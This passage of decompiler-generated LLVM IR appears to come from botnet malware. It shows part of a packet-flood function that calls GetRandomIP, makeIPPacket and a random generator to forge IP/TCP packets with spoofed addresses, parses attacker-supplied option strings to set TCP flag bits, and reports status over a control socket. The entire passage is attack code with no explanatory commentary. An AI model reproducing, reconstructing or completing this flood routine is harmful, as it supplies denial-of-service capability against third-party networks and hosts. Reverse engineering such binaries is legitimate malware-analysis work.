  %v5_804cebb = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804cebb, i1* %cf.global-to-local, align 1
  %v3_804cec4 = call i32 @sockprintf(i32 %v0_804ceb6, i32 ptrtoint ([33 x i8]* @global_var_805798c.221 to i32))
  store i32 %v3_804cec4, i32* %eax.global-to-local, align 4
  %v0_804cec9 = load i32, i32* @esp, align 4
  %v2_804cec9 = icmp ugt i32 %v0_804cec9, -17
  store i1 %v2_804cec9, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d36e

dec_label_pc_804ced1:                             ; preds = %dec_label_pc_804ce93
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ced1 = icmp eq i32 %arg4, 0
  %v1_804ced5 = icmp eq i1 %v4_804ced1, false
  br i1 %v1_804ced5, label %dec_label_pc_804cee0, label %dec_label_pc_804cef6

dec_label_pc_804cee0:                             ; preds = %dec_label_pc_804ced1
  %v5_804cee7 = sub i32 32, %arg4
  %v10_804cee7 = icmp ugt i32 %arg4, 32
  store i1 %v10_804cee7, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804ceef = urem i32 %v5_804cee7, 32
  %v4_804ceef = icmp eq i32 %v2_804ceef, 0
  br i1 %v4_804ceef, label %bb102, label %bb

bb:                                               ; preds = %dec_label_pc_804cee0
  %v5_804ceef = shl i32 1, %v2_804ceef
  store i32 %v5_804ceef, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb102

bb102:                                            ; preds = %dec_label_pc_804cee0, %bb
  %v0_804cef1 = phi i32 [ 1, %dec_label_pc_804cee0 ], [ %v5_804ceef, %bb ]
  %v1_804cef1 = sub i32 0, %v0_804cef1
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804cef1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cef6

dec_label_pc_804cef6:                             ; preds = %dec_label_pc_804ced1, %bb102
  %storemerge12 = phi i32 [ %v1_804cef1, %bb102 ], [ 0, %dec_label_pc_804ced1 ]
  %v1_804cef9 = add i32 %arg6, 40
  %v1_804cf05 = add i32 %arg6, 70
  %v2_804cf08 = and i32 %v1_804cf05, -16
  %v2_804cf0e = sub i32 %v15_804cded, %v2_804cf08
  %v1_804cf16 = add i32 %v2_804cf0e, 15
  %v2_804cf19 = and i32 %v1_804cf16, -16
  store i32 %v2_804cf19, i32* %edx.global-to-local, align 4
  %v1_804cf31 = add i32 %v2_804cf19, 20
  %v5_804cf34 = inttoptr i32 %v1_804cf31 to i16*
  %v1_804cf3a = add i32 %arg6, 20
  store i32 %v1_804cf3a, i32* %eax.global-to-local, align 4
  store i32 %v1_804cf3a, i32* @ebx, align 4
  %v5_804cf3f = icmp ult i32 %v2_804cf0e, 12
  store i1 %v5_804cf3f, i1* %cf.global-to-local, align 1
  %v5_804cf42 = add i32 %v2_804cf0e, -16
  %v6_804cf42 = inttoptr i32 %v5_804cf42 to i32*
  store i32 %storemerge12, i32* %v6_804cf42, align 4
  %v2_804cf45 = call i32 @GetRandomIP(i32 %v1_804cef9, i32 %v2_804cf19)
  store i32 %v2_804cf45, i32* %eax.global-to-local, align 4
  %v0_804cf4a = load i32, i32* @esp, align 4
  %v1_804cf4a = add i32 %v0_804cf4a, 16
  %v5_804cf4d = icmp ult i32 %v1_804cf4a, 12
  store i1 %v5_804cf4d, i1* %cf.global-to-local, align 1
  %v3_804cf50 = inttoptr i32 %v0_804cf4a to i32*
  store i32 %v2_804cf45, i32* %v3_804cf50, align 4
  %v0_804cf51 = call i32 @htonl()
  store i32 %v0_804cf51, i32* %eax.global-to-local, align 4
  %v0_804cf56 = load i32, i32* @esp, align 4
  %v3_804cf59 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804cf59, i32* %edx.global-to-local, align 4
  %tmp105 = and i32 %v0_804cf56, -4
  %v5_804cf5c = icmp eq i32 %tmp105, -16
  store i1 %v5_804cf5c, i1* %cf.global-to-local, align 1
  %v0_804cf5f = load i32, i32* @ebx, align 4
  %v2_804cf5f = add i32 %v0_804cf56, 8
  %v3_804cf5f = inttoptr i32 %v2_804cf5f to i32*
  store i32 %v0_804cf5f, i32* %v3_804cf5f, align 4
  %v1_804cf60 = add i32 %v0_804cf56, 4
  %v2_804cf60 = inttoptr i32 %v1_804cf60 to i32*
  store i32 6, i32* %v2_804cf60, align 4
  %v3_804cf62 = inttoptr i32 %v0_804cf56 to i32*
  store i32 %v0_804cf51, i32* %v3_804cf62, align 4
  %v0_804cf63 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cf63 = add i32 %v0_804cf56, -4
  %v3_804cf63 = inttoptr i32 %v2_804cf63 to i32*
  store i32 %v0_804cf63, i32* %v3_804cf63, align 4
  %v5_804cf64 = add i32 %v0_804cf56, -8
  %v6_804cf64 = inttoptr i32 %v5_804cf64 to i32*
  store i32 %v2_804cf19, i32* %v6_804cf64, align 4
  %v0_804cf67 = call i32 @makeIPPacket()
  store i32 %v0_804cf67, i32* %eax.global-to-local, align 4
  %v0_804cf6c = load i32, i32* @esp, align 4
  %v5_804cf6c = icmp ugt i32 %v0_804cf6c, -25
  store i1 %v5_804cf6c, i1* %cf.global-to-local, align 1
  %v2_804cf6f = call i32 @rand_cmwc(i32 %v1_804cf31)
  %sext = mul i32 %v2_804cf6f, 65536
  %v1_804cf74 = sdiv i32 %sext, 65536
  store i32 %v1_804cf74, i32* %edx.global-to-local, align 4
  store i32 %v1_804cf31, i32* %eax.global-to-local, align 4
  %v1_804cf79 = trunc i32 %v1_804cf74 to i16
  store i16 %v1_804cf79, i16* %v5_804cf34, align 4
  %v2_804cf7c = call i32 @rand_cmwc(i32 %v1_804cf31)
  %v2_804cf86 = add i32 %v2_804cf19, 24
  %v3_804cf86 = inttoptr i32 %v2_804cf86 to i32*
  store i32 %v2_804cf7c, i32* %v3_804cf86, align 8
  store i32 %v1_804cf31, i32* %eax.global-to-local, align 4
  %v1_804cf8c = add i32 %v2_804cf19, 28
  %v2_804cf8c = inttoptr i32 %v1_804cf8c to i32*
  store i32 0, i32* %v2_804cf8c, align 4
  store i32 %v1_804cf31, i32* %edx.global-to-local, align 4
  %v1_804cf96 = add i32 %v2_804cf19, 32
  %v2_804cf96 = inttoptr i32 %v1_804cf96 to i8*
  %v3_804cf96 = load i8, i8* %v2_804cf96, align 16
  %v1_804cf99 = urem i8 %v3_804cf96, 16
  %v1_804cf9c = or i8 %v1_804cf99, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804cf9c, i8* %v2_804cf96, align 16
  %v4_804cfa2 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804cfa2, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804cfa2, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80579ad.222 to i32), i32* @edi, align 4
  %v6_804cfc0 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80579ad.222, i32 0, i32 0), i32 4)
  %v7_804cfc0 = urem i32 %v6_804cfc0, 2
  %v8_804cfc0 = icmp eq i32 %v7_804cfc0, 0
  %v0_804cfc2 = load i1, i1* %cf.global-to-local, align 1
  %v2_804cfc2 = or i1 %v0_804cfc2, %v8_804cfc0
  %v3_804cfc2 = zext i1 %v2_804cfc2 to i32
  %v4_804cfc2 = load i32, i32* %edx.global-to-local, align 4
  %v5_804cfc2 = and i32 %v4_804cfc2, -256
  %v6_804cfc2 = or i32 %v3_804cfc2, %v5_804cfc2
  %v7_804cfc2 = xor i32 %v6_804cfc2, 1
  store i32 %v7_804cfc2, i32* @edx, align 4
  %v3_804cfc8 = and i32 %v6_804cfc0, -256
  %v1_804cfca = trunc i32 %v7_804cfc2 to i8
  %v3_804cfca = zext i1 %v0_804cfc2 to i8
  %v4_804cfca = sub nsw i8 %v1_804cfca, %v3_804cfca
  %v15_804cfca = icmp eq i8 %v4_804cfca, 0
  %v20_804cfca = zext i8 %v4_804cfca to i32
  %v23_804cfca = or i32 %v20_804cfca, %v3_804cfc8
  store i32 %v23_804cfca, i32* @ecx, align 4
  %v2_804cfce = sext i8 %v4_804cfca to i32
  store i32 %v2_804cfce, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804cfd3 = icmp eq i1 %v15_804cfca, false
  br i1 %v1_804cfd3, label %dec_label_pc_804d016, label %dec_label_pc_804cfd5

dec_label_pc_804cfd5:                             ; preds = %dec_label_pc_804cef6
  store i32 %v1_804cf31, i32* %edx.global-to-local, align 4
  %v1_804cfd8 = add i32 %v2_804cf19, 33
  %v2_804cfd8 = inttoptr i32 %v1_804cfd8 to i8*
  %v3_804cfd8 = load i8, i8* %v2_804cfd8, align 1
  %v4_804cfd8 = zext i8 %v3_804cfd8 to i32
  %v6_804cfd8 = and i32 %v2_804cfce, -256
  %v7_804cfd8 = or i32 %v6_804cfd8, %v4_804cfd8
  %v1_804cfdb = or i32 %v7_804cfd8, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804cfdb = trunc i32 %v1_804cfdb to i8
  store i32 %v1_804cfdb, i32* %eax.global-to-local, align 4
  store i8 %v3_804cfdb, i8* %v2_804cfd8, align 1
  store i32 %v1_804cf31, i32* %edx.global-to-local, align 4
  %v3_804cfe4 = load i8, i8* %v2_804cfd8, align 1
  %v4_804cfe4 = zext i8 %v3_804cfe4 to i32
  %v5_804cfe4 = load i32, i32* %eax.global-to-local, align 4
  %v6_804cfe4 = and i32 %v5_804cfe4, -256
  %v7_804cfe4 = or i32 %v4_804cfe4, %v6_804cfe4
  %v1_804cfe7 = or i32 %v7_804cfe4, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804cfe7 = trunc i32 %v1_804cfe7 to i8
  store i32 %v1_804cfe7, i32* %eax.global-to-local, align 4
  store i8 %v3_804cfe7, i8* %v2_804cfd8, align 1
  store i32 %v1_804cf31, i32* %edx.global-to-local, align 4
  %v3_804cff0 = load i8, i8* %v2_804cfd8, align 1
  %v4_804cff0 = zext i8 %v3_804cff0 to i32
  %v5_804cff0 = load i32, i32* %eax.global-to-local, align 4
  %v6_804cff0 = and i32 %v5_804cff0, -256
  %v7_804cff0 = or i32 %v4_804cff0, %v6_804cff0
  %v1_804cff3 = or i32 %v7_804cff0, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804cff3 = trunc i32 %v1_804cff3 to i8
  store i32 %v1_804cff3, i32* %eax.global-to-local, align 4
  store i8 %v3_804cff3, i8* %v2_804cfd8, align 1
  store i32 %v1_804cf31, i32* %edx.global-to-local, align 4
  %v3_804cffc = load i8, i8* %v2_804cfd8, align 1
  %v4_804cffc = zext i8 %v3_804cffc to i32
  %v5_804cffc = load i32, i32* %eax.global-to-local, align 4
  %v6_804cffc = and i32 %v5_804cffc, -256
  %v7_804cffc = or i32 %v4_804cffc, %v6_804cffc
  %v1_804cfff = or i32 %v7_804cffc, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804cfff = trunc i32 %v1_804cfff to i8
  store i32 %v1_804cfff, i32* %eax.global-to-local, align 4
  store i8 %v3_804cfff, i8* %v2_804cfd8, align 1
  store i32 %v1_804cf31, i32* %edx.global-to-local, align 4
  %v3_804d008 = load i8, i8* %v2_804cfd8, align 1
  %v4_804d008 = zext i8 %v3_804d008 to i32
  %v5_804d008 = load i32, i32* %eax.global-to-local, align 4
  %v6_804d008 = and i32 %v5_804d008, -256
  %v7_804d008 = or i32 %v4_804d008, %v6_804d008
  %v1_804d00b = or i32 %v7_804d008, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804d00b = trunc i32 %v1_804d00b to i8
  store i32 %v1_804d00b, i32* %eax.global-to-local, align 4
  store i8 %v3_804d00b, i8* %v2_804cfd8, align 1
  %v0_804d1e2.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804d1e2

dec_label_pc_804d016:                             ; preds = %dec_label_pc_804cef6
  store i32 %v4_804cfa2, i32* @eax, align 4
  %v0_804d019 = load i32, i32* @esp, align 4
  %v5_804d019 = icmp ult i32 %v0_804d019, 8
  store i1 %v5_804d019, i1* %cf.global-to-local, align 1
  %v1_804d01c = add i32 %v0_804d019, -12
  %v2_804d01c = inttoptr i32 %v1_804d01c to i32*
  store i32 ptrtoint (i32* @global_var_80579b1.223 to i32), i32* %v2_804d01c, align 4
  %v0_804d021 = load i32, i32* @eax, align 4
  %v2_804d021 = add i32 %v0_804d019, -16
  %v3_804d021 = inttoptr i32 %v2_804d021 to i32*
  store i32 %v0_804d021, i32* %v3_804d021, align 4
  %v3_804d022 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_80579ad.222 to i32))
  store i32 %v3_804d022, i32* %eax.global-to-local, align 4
  %v5_804d02a = inttoptr i32 %v3_804d022 to i8*
  store i8* %v5_804d02a, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804d1d821 = icmp eq i32 %v3_804d022, 0
  %v1_804d1dc28 = icmp eq i1 %v5_804d1d821, false
  br i1 %v1_804d1dc28, label %dec_label_pc_804d032.lr.ph, label %dec_label_pc_804d1e2

dec_label_pc_804d032.lr.ph:                       ; preds = %dec_label_pc_804d016
  %v1_804d19f = add i32 %v2_804cf19, 33
  %v2_804d19f = inttoptr i32 %v1_804d19f to i8*
  %tmp103 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804d032

dec_label_pc_804d032:                             ; preds = %dec_label_pc_804d032.lr.ph, %dec_label_pc_804d1c3
  %v3_804d1b2 = phi i8* [ %v5_804d02a, %dec_label_pc_804d032.lr.ph ], [ %tmp104, %dec_label_pc_804d1c3 ]
  %stack_var_-156.130 = phi i8* [ %tmp49, %dec_label_pc_804d032.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804d1c3 ]
  %stack_var_-160.129 = phi i32 [ %tmp48, %dec_label_pc_804d032.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804d1c3 ]
  %v4_804d032 = ptrtoint i8* %v3_804d1b2 to i32
  store i32 %v4_804d032, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d032, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80579b3.224 to i32), i32* @edi, align 4
  %v6_804d050 = call i32 @_strncmp(i8* %v3_804d1b2, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80579b3.224, i32 0, i32 0), i32 4)
  %v7_804d050 = urem i32 %v6_804d050, 2
  %v8_804d050 = icmp eq i32 %v7_804d050, 0
  %v0_804d052 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d052 = or i1 %v0_804d052, %v8_804d050
  %v3_804d052 = zext i1 %v2_804d052 to i32
  %v4_804d052 = load i32, i32* @edx, align 4
  %v5_804d052 = and i32 %v4_804d052, -256
  %v6_804d052 = or i32 %v3_804d052, %v5_804d052
  %v7_804d052 = xor i32 %v6_804d052, 1
  store i32 %v7_804d052, i32* %edx.global-to-local, align 4
  %v3_804d058 = and i32 %v6_804d050, -256
  %v1_804d05a = trunc i32 %v7_804d052 to i8
  %v3_804d05a = zext i1 %v0_804d052 to i8
  %v4_804d05a = sub nsw i8 %v1_804d05a, %v3_804d05a
  %v15_804d05a = icmp eq i8 %v4_804d05a, 0
  %v20_804d05a = zext i8 %v4_804d05a to i32
  %v23_804d05a = or i32 %v20_804d05a, %v3_804d058
  store i32 %v23_804d05a, i32* @ecx, align 4
  %v2_804d05e = sext i8 %v4_804d05a to i32
  store i32 %v2_804d05e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d063 = icmp eq i1 %v15_804d05a, false
  br i1 %v1_804d063, label %dec_label_pc_804d076, label %dec_label_pc_804d065

dec_label_pc_804d065:                             ; preds = %dec_label_pc_804d032
  store i32 %v1_804cf31, i32* @eax, align 4
  %v3_804d068 = load i8, i8* %v2_804d19f, align 1
  %v4_804d068 = zext i8 %v3_804d068 to i32
  %v7_804d068 = or i32 %v5_804d052, %v4_804d068
  %v1_804d06b = or i32 %v7_804d068, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804d06b = trunc i32 %v1_804d06b to i8
  store i32 %v1_804d06b, i32* @edx, align 4
  store i8 %v3_804d06b, i8* %v2_804d19f, align 1
  br label %dec_label_pc_804d1c3

dec_label_pc_804d076:                             ; preds = %dec_label_pc_804d032
  store i32 %v4_804d032, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d032, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80579b7.225 to i32), i32* @edi, align 4
  %v6_804d094 = call i32 @_strncmp(i8* %v3_804d1b2, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80579b7.225, i32 0, i32 0), i32 4)
  %v7_804d094 = urem i32 %v6_804d094, 2
  %v8_804d094 = icmp eq i32 %v7_804d094, 0
  %v0_804d096 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d096 = or i1 %v0_804d096, %v8_804d094
  %v3_804d096 = zext i1 %v2_804d096 to i32
  %v4_804d096 = load i32, i32* %edx.global-to-local, align 4
  %v5_804d096 = and i32 %v4_804d096, -256
  %v6_804d096 = or i32 %v3_804d096, %v5_804d096
  %v7_804d096 = xor i32 %v6_804d096, 1
  store i32 %v7_804d096, i32* %edx.global-to-local, align 4
  %v3_804d09c = and i32 %v6_804d094, -256
  %v1_804d09e = trunc i32 %v7_804d096 to i8
  %v3_804d09e = zext i1 %v0_804d096 to i8
  %v4_804d09e = sub nsw i8 %v1_804d09e, %v3_804d09e
  %v15_804d09e = icmp eq i8 %v4_804d09e, 0
  %v20_804d09e = zext i8 %v4_804d09e to i32
  %v23_804d09e = or i32 %v20_804d09e, %v3_804d09c
  store i32 %v23_804d09e, i32* @ecx, align 4
  %v2_804d0a2 = sext i8 %v4_804d09e to i32
  store i32 %v2_804d0a2, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d0a7 = icmp eq i1 %v15_804d09e, false
  br i1 %v1_804d0a7, label %dec_label_pc_804d0ba, label %dec_label_pc_804d0a9

dec_label_pc_804d0a9:                             ; preds = %dec_label_pc_804d076
  store i32 %v1_804cf31, i32* @eax, align 4
  %v3_804d0ac = load i8, i8* %v2_804d19f, align 1
  %v4_804d0ac = zext i8 %v3_804d0ac to i32
  %v7_804d0ac = or i32 %v5_804d096, %v4_804d0ac
  %v1_804d0af = or i32 %v7_804d0ac, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804d0af = trunc i32 %v1_804d0af to i8
  store i32 %v1_804d0af, i32* @edx, align 4
  store i8 %v3_804d0af, i8* %v2_804d19f, align 1
  br label %dec_label_pc_804d1c3

dec_label_pc_804d0ba:                             ; preds = %dec_label_pc_804d076
  store i32 %v4_804d032, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d032, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80579bb.226 to i32), i32* @edi, align 4
  %v6_804d0de = call i32 @_strncmp(i8* %v3_804d1b2, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80579bb.226, i32 0, i32 0), i32 4)
  %v7_804d0de = urem i32 %v6_804d0de, 2
  %v8_804d0de = icmp eq i32 %v7_804d0de, 0
  %v0_804d0e0 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d0e0 = or i1 %v0_804d0e0, %v8_804d0de
  %v3_804d0e0 = zext i1 %v2_804d0e0 to i32
  %v4_804d0e0 = load i32, i32* %edx.global-to-local, align 4
  %v5_804d0e0 = and i32 %v4_804d0e0, -256
  %v6_804d0e0 = or i32 %v3_804d0e0, %v5_804d0e0
  %v7_804d0e0 = xor i32 %v6_804d0e0, 1
  store i32 %v7_804d0e0, i32* %edx.global-to-local, align 4
  %v3_804d0e6 = and i32 %v6_804d0de, -256
  %v1_804d0e8 = trunc i32 %v7_804d0e0 to i8
  %v3_804d0e8 = zext i1 %v0_804d0e0 to i8
  %v4_804d0e8 = sub nsw i8 %v1_804d0e8, %v3_804d0e8
  %v15_804d0e8 = icmp eq i8 %v4_804d0e8, 0
  %v20_804d0e8 = zext i8 %v4_804d0e8 to i32
  %v23_804d0e8 = or i32 %v20_804d0e8, %v3_804d0e6
  store i32 %v23_804d0e8, i32* @ecx, align 4
  %v2_804d0ec = sext i8 %v4_804d0e8 to i32
  store i32 %v2_804d0ec, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d0f1 = icmp eq i1 %v15_804d0e8, false
  br i1 %v1_804d0f1, label %dec_label_pc_804d104, label %dec_label_pc_804d0f3

dec_label_pc_804d0f3:                             ; preds = %dec_label_pc_804d0ba
  store i32 %v1_804cf31, i32* @eax, align 4
  %v3_804d0f6 = load i8, i8* %v2_804d19f, align 1
  %v4_804d0f6 = zext i8 %v3_804d0f6 to i32
  %v7_804d0f6 = or i32 %v5_804d0e0, %v4_804d0f6
  %v1_804d0f9 = or i32 %v7_804d0f6, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804d0f9 = trunc i32 %v1_804d0f9 to i8
  store i32 %v1_804d0f9, i32* @edx, align 4
  store i8 %v3_804d0f9, i8* %v2_804d19f, align 1
  br label %dec_label_pc_804d1c3

dec_label_pc_804d104:                             ; preds = %dec_label_pc_804d0ba
  store i32 %v4_804d032, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d032, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80579bf.227 to i32), i32* @edi, align 4
  %v6_804d134 = call i32 @_strncmp(i8* %v3_804d1b2, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80579bf.227, i32 0, i32 0), i32 4)
  %v7_804d134 = urem i32 %v6_804d134, 2
  %v8_804d134 = icmp eq i32 %v7_804d134, 0
  %v0_804d136 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d136 = or i1 %v0_804d136, %v8_804d134
  %v3_804d136 = zext i1 %v2_804d136 to i32
  %v4_804d136 = load i32, i32* %edx.global-to-local, align 4
  %v5_804d136 = and i32 %v4_804d136, -256
  %v6_804d136 = or i32 %v3_804d136, %v5_804d136
  %v7_804d136 = xor i32 %v6_804d136, 1
  store i32 %v7_804d136, i32* %edx.global-to-local, align 4
  %v3_804d13c = and i32 %v6_804d134, -256
  %v1_804d13e = trunc i32 %v7_804d136 to i8
  %v3_804d13e = zext i1 %v0_804d136 to i8
  %v4_804d13e = sub nsw i8 %v1_804d13e, %v3_804d13e
  %v15_804d13e = icmp eq i8 %v4_804d13e, 0
  %v20_804d13e = zext i8 %v4_804d13e to i32
  %v23_804d13e = or i32 %v20_804d13e, %v3_804d13c
  store i32 %v23_804d13e, i32* @ecx, align 4
  %v2_804d142 = sext i8 %v4_804d13e to i32
  store i32 %v2_804d142, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d147 = icmp eq i1 %v15_804d13e, false
  br i1 %v1_804d147, label %dec_label_pc_804d157, label %dec_label_pc_804d149

dec_label_pc_804d149:                             ; preds = %dec_label_pc_804d104
  store i32 %v1_804cf31, i32* @eax, align 4
  %v3_804d14c = load i8, i8* %v2_804d19f, align 1
  %v4_804d14c = zext i8 %v3_804d14c to i32
  %v7_804d14c = or i32 %v5_804d136, %v4_804d14c
  %v1_804d14f = or i32 %v7_804d14c, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804d14f = trunc i32 %v1_804d14f to i8
  store i32 %v1_804d14f, i32* @edx, align 4
  store i8 %v3_804d14f, i8* %v2_804d19f, align 1
  br label %dec_label_pc_804d1c3

dec_label_pc_804d157:                             ; preds = %dec_label_pc_804d104
  store i32 %v4_804d032, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804d032, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80579c3.228 to i32), i32* @edi, align 4
  %v6_804d187 = call i32 @_strncmp(i8* %v3_804d1b2, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80579c3.228, i32 0, i32 0), i32 4)
  %v7_804d187 = urem i32 %v6_804d187, 2
  %v8_804d187 = icmp eq i32 %v7_804d187, 0
  %v0_804d189 = load i1, i1* %cf.global-to-local, align 1
  %v2_804d189 = or i1 %v0_804d189, %v8_804d187
  %v3_804d189 = zext i1 %v2_804d189 to i32
  %v4_804d189 = load i32, i32* %edx.global-to-local, align 4
  %v5_804d189 = and i32 %v4_804d189, -256
  %v6_804d189 = or i32 %v3_804d189, %v5_804d189
  %v7_804d189 = xor i32 %v6_804d189, 1
  store i32 %v7_804d189, i32* %edx.global-to-local, align 4
  %v3_804d18f = and i32 %v6_804d187, -256
  %v1_804d191 = trunc i32 %v7_804d189 to i8
  %v3_804d191 = zext i1 %v0_804d189 to i8
  %v4_804d191 = sub nsw i8 %v1_804d191, %v3_804d191
  %v15_804d191 = icmp eq i8 %v4_804d191, 0
  %v20_804d191 = zext i8 %v4_804d191 to i32
  %v23_804d191 = or i32 %v20_804d191, %v3_804d18f
  store i32 %v23_804d191, i32* @ecx, align 4
  %v2_804d195 = sext i8 %v4_804d191 to i32
  store i32 %v2_804d195, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d19a = icmp eq i1 %v15_804d191, false
  br i1 %v1_804d19a, label %dec_label_pc_804d1aa, label %dec_label_pc_804d19c

dec_label_pc_804d19c:                             ; preds = %dec_label_pc_804d157
  store i32 %v1_804cf31, i32* @eax, align 4
  %v3_804d19f = load i8, i8* %v2_804d19f, align 1
  %v4_804d19f = zext i8 %v3_804d19f to i32
  %v7_804d19f = or i32 %v5_804d189, %v4_804d19f
  %v1_804d1a2 = or i32 %v7_804d19f, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804d1a2 = trunc i32 %v1_804d1a2 to i8
  store i32 %v1_804d1a2, i32* @edx, align 4
  store i8 %v3_804d1a2, i8* %v2_804d19f, align 1
  br label %dec_label_pc_804d1c3

dec_label_pc_804d1aa:                             ; preds = %dec_label_pc_804d157
  %v0_804d1aa = load i32, i32* @global_var_8061580.20, align 128
  store i32 %v0_804d1aa, i32* %eax.global-to-local, align 4
  %v0_804d1af = load i32, i32* @esp, align 4
  %v5_804d1af = icmp ult i32 %v0_804d1af, 4
  store i1 %v5_804d1af, i1* %cf.global-to-local, align 1
  %v6_804d1b2 = add i32 %v0_804d1af, -8
  %v7_804d1b2 = inttoptr i32 %v6_804d1b2 to i32*
  store i32 %v4_804d032, i32* %v7_804d1b2, align 4
  %v1_804d1b5 = add i32 %v0_804d1af, -12
  %v2_804d1b5 = inttoptr i32 %v1_804d1b5 to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_80579c7.229 to i32), i32* %v2_804d1b5, align 4
  %v0_804d1ba = load i32, i32* %eax.global-to-local, align 4
  %v2_804d1ba = add i32 %v0_804d1af, -16
  %v3_804d1ba = inttoptr i32 %v2_804d1ba to i32*
  store i32 %v0_804d1ba, i32* %v3_804d1ba, align 4
  %v3_804d1bb = call i32 @sockprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_80579c3.228 to i32))
  store i32 %v3_804d1bb, i32* @eax, align 4
  %v0_804d1c0 = load i32, i32* @esp, align 4
  %v2_804d1c0 = icmp ugt i32 %v0_804d1c0, -17
  store i1 %v2_804d1c0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804d1c3

dec_label_pc_804d1c3:                             ; preds = %dec_label_pc_804d19c, %dec_label_pc_804d149, %dec_label_pc_804d0f3, %dec_label_pc_804d0a9, %dec_label_pc_804d065, %dec_label_pc_804d1aa
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804d1aa ], [ 4, %dec_label_pc_804d19c ], [ %stack_var_-160.129, %dec_label_pc_804d149 ], [ %stack_var_-160.129, %dec_label_pc_804d0f3 ], [ %stack_var_-160.129, %dec_label_pc_804d0a9 ], [ %stack_var_-160.129, %dec_label_pc_804d065 ]
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80579c3.228, i32 0, i32 0), %dec_label_pc_804d1aa ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80579c3.228, i32 0, i32 0), %dec_label_pc_804d19c ], [ %stack_var_-156.130, %dec_label_pc_804d149 ], [ %stack_var_-156.130, %dec_label_pc_804d0f3 ], [ %stack_var_-156.130, %dec_label_pc_804d0a9 ], [ %stack_var_-156.130, %dec_label_pc_804d065 ]
  %v0_804d1c3 = load i32, i32* @esp, align 4
  %v5_804d1c3 = icmp ult i32 %v0_804d1c3, 8
  store i1 %v5_804d1c3, i1* %cf.global-to-local, align 1
  %v1_804d1c6 = add i32 %v0_804d1c3, -12
  %v2_804d1c6 = inttoptr i32 %v1_804d1c6 to i32*
  store i32 ptrtoint (i32* @global_var_80579b1.223 to i32), i32* %v2_804d1c6, align 4
  %v1_804d1cb = add i32 %v0_804d1c3, -16
  %v2_804d1cb = inttoptr i32 %v1_804d1cb to i32*
  store i32 0, i32* %v2_804d1cb, align 4
  %v2_804d1cd = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804d1cd = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804d1cd)
  store i32 %v3_804d1cd, i32* %eax.global-to-local, align 4
  store i32 %v3_804d1cd, i32* %tmp103, align 4
  store i1 false, i1* %cf.global-to-local, align 1
